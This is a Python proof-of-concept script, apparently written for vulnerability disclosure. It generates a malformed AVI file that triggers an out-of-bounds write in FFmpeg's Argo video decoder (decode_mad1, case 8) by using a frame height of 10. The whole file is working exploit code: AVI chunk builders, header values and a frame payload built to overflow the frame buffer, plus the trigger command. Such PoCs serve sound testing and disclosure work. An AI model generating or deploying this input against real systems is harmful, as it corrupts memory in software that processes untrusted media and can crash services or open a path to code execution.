#!/usr/bin/env python3
"""
PoC generator for VULN 001: decode_mad1() case-8 OOB Write (CWE-787)
in FFmpeg libavcodec/argo.c

Vulnerability: When frame height is not a multiple of 8 (e.g., h=10),
the outer loop for (y=0; y<h; y+=8) triggers a final iteration at y=8
where the inner loop unconditionally writes 8 rows starting at row 8,
but only rows 8-9 are valid. Rows 10-15 overflow the frame buffer.

Trigger path:
  ffmpeg -vcodec argo -i evil.avi -f null -
  -> avformat_open_input()
  -> avcodec_send_packet()
  -> decode_frame()           [chunk tag 'MAD1']
  -> decode_mad1()
  -> case 8: inner memset loop writes past end of frame buffer
"""

import struct
import sys
import os

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_input.avi")

def le32(v):
    return struct.pack('<I', v & 0xFFFFFFFF)

def le16(v):
    return struct.pack('<H', v & 0xFFFF)

def avi_chunk(fourcc, data):
    """Build an AVI chunk: fourcc(4) + size(4) + data [+ pad if odd]"""
    assert len(fourcc) == 4
    padded = data
    if len(data) % 2 != 0:
        padded = data + b'\x00'
    return fourcc.encode('ascii') + le32(len(data)) + padded

def avi_list(fourcc, data):
    """Build a LIST chunk: 'LIST'(4) + size(4) + fourcc(4) + data"""
    assert len(fourcc) == 4
    content = fourcc.encode('ascii') + data
    return b'LIST' + le32(len(content)) + content

def build_avi():
    width  = 8   # divisible by 8
    height = 10  # even but NOT divisible by 8 (triggers OOB: y=8 iterates rows 8-15)
    fps_scale = 1
    fps_rate  = 1
    usec_per_frame = 1000000  # 1 fps

    # Argo codec fourcc: MKTAG('A','r','g','o') = little-endian 0x6F677241
    # Stored in biCompression as little-endian bytes: 0x41 0x72 0x67 0x6F
    argo_fourcc_int = struct.unpack('<I', b'Argo')[0]  # = 0x6F677241

    # ----------------------------------------------------------------
    # Frame data: MAD1 block with type=8
    #
    # decode_frame() reads 4-byte big-endian chunk tag 'MAD1' first,
    # then calls decode_mad1() which loops:
    #   type = bytestream2_get_byte()
    #   case 8:
    #     for y in 0..h step 8:   (y=0 and y=8 for h=10)
    #       for x in 0..w step 8: (x=0 for w=8)
    #         fill = bytestream2_get_byte()
    #         for by in 0..8:     (always 8 rows, OOB when y=8)
    #           memset(dst, fill, 8)
    #           dst += linesize
    #
    # We need: 1 type byte + 2 fill bytes (one per 8x8 block: (y=0,x=0) and (y=8,x=0))
    # Then 0xFF to terminate the outer while loop cleanly.
    # ----------------------------------------------------------------
    frame_payload = (
        b'MAD1'      # 4 bytes: chunk tag (MKBETAG big-endian 'MAD1')
        + b'\x08'    # type = 8 (triggers the vulnerable case)
        + b'\x41'    # fill byte for block (y=0, x=0)
        + b'\x41'    # fill byte for block (y=8, x=0) -- OOB write happens here
        + b'\xFF'    # end-of-stream sentinel → breaks out of while loop
    )
    # 8 bytes total: already even, no padding needed

    # ----------------------------------------------------------------
    # MainAVIHeader (avih) - 56 bytes
    # ----------------------------------------------------------------
    avih_data = (
        le32(usec_per_frame)   # dwMicroSecPerFrame
        + le32(0)              # dwMaxBytesPerSec
        + le32(0)              # dwPaddingGranularity
        + le32(0x00000010)     # dwFlags: AVIF_HASINDEX
        + le32(1)              # dwTotalFrames
        + le32(0)              # dwInitialFrames
        + le32(1)              # dwStreams
        + le32(0)              # dwSuggestedBufferSize
        + le32(width)          # dwWidth
        + le32(height)         # dwHeight
        + le32(0)              # dwReserved[0]
        + le32(0)              # dwReserved[1]
        + le32(0)              # dwReserved[2]
        + le32(0)              # dwReserved[3]
    )
    assert len(avih_data) == 56, f"avih_data size mismatch: {len(avih_data)}"

    # ----------------------------------------------------------------
    # AVIStreamHeader (strh) - 56 bytes
    # ----------------------------------------------------------------
    strh_data = (
        b'vids'                # fccType
        + le32(argo_fourcc_int)# fccHandler: 'Argo'
        + le32(0)              # dwFlags
        + le16(0)              # wPriority
        + le16(0)              # wLanguage
        + le32(0)              # dwInitialFrames
        + le32(fps_scale)      # dwScale
        + le32(fps_rate)       # dwRate
        + le32(0)              # dwStart
        + le32(1)              # dwLength (1 frame)
        + le32(len(frame_payload))  # dwSuggestedBufferSize
        + le32(0xFFFFFFFF)     # dwQuality (-1 = default)
        + le32(0)              # dwSampleSize
        + le16(0)              # rcFrame.left
        + le16(0)              # rcFrame.top
        + le16(width)          # rcFrame.right
        + le16(height)         # rcFrame.bottom
    )
    assert len(strh_data) == 56, f"strh_data size mismatch: {len(strh_data)}"

    # ----------------------------------------------------------------
    # BITMAPINFOHEADER (strf) - 40 bytes
    # bits_per_coded_sample is read from biBitCount in the AVI demuxer
    # and passed to decode_init() which sets PAL8 mode for biBitCount=8
    # ----------------------------------------------------------------
    strf_data = (
        le32(40)               # biSize
        + le32(width)          # biWidth
        + le32(height)         # biHeight (positive = bottom-up)
        + le16(1)              # biPlanes
        + le16(8)              # biBitCount = 8 → bits_per_coded_sample=8 → PAL8 mode
        + le32(argo_fourcc_int)# biCompression: 'Argo' fourcc
        + le32(width * height) # biSizeImage = 80
        + le32(0)              # biXPelsPerMeter
        + le32(0)              # biYPelsPerMeter
        + le32(0)              # biClrUsed (0 = use all colors)
        + le32(0)              # biClrImportant
    )
    assert len(strf_data) == 40, f"strf_data size mismatch: {len(strf_data)}"

    # ----------------------------------------------------------------
    # Assemble the header list
    # ----------------------------------------------------------------
    avih_chunk = avi_chunk('avih', avih_data)
    strh_chunk = avi_chunk('strh', strh_data)
    strf_chunk = avi_chunk('strf', strf_data)

    strl_list = avi_list('strl', strh_chunk + strf_chunk)
    hdrl_list = avi_list('hdrl', avih_chunk + strl_list)

    # ----------------------------------------------------------------
    # movi list with one video frame chunk '00dc'
    # ----------------------------------------------------------------
    frame_chunk = avi_chunk('00dc', frame_payload)
    movi_list   = avi_list('movi', frame_chunk)

    # ----------------------------------------------------------------
    # idx1 index chunk
    # The offset in idx1 is relative to the start of the movi data
    # (i.e., the position right after the 'movi' fourcc tag).
    # The '00dc' chunk starts at offset 0 within the movi data.
    # ----------------------------------------------------------------
    idx1_entry = (
        b'00dc'                # chunk id
        + le32(0x00000010)     # flags: AVIIF_KEYFRAME
        + le32(4)              # offset: 4 bytes past 'movi' tag = start of first chunk
        + le32(len(frame_payload))  # size of chunk data
    )
    idx1_chunk = avi_chunk('idx1', idx1_entry)

    # ----------------------------------------------------------------
    # Final RIFF AVI assembly
    # ----------------------------------------------------------------
    riff_content = b'AVI ' + hdrl_list + movi_list + idx1_chunk
    riff = b'RIFF' + le32(len(riff_content)) + riff_content

    return riff

if __name__ == '__main__':
    data = build_avi()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUTPUT_FILE}")
    print(f"    width=8, height=10, biBitCount=8, codec='Argo'")
    print(f"    Frame: MAD1 magic + type=0x08 + 2 fill bytes + 0xFF sentinel")
    print(f"    Trigger: y=8 outer iteration writes 8 rows starting at row 8,")
    print(f"             but only rows 8-9 are valid (h=10). Rows 10-15 = OOB write.")
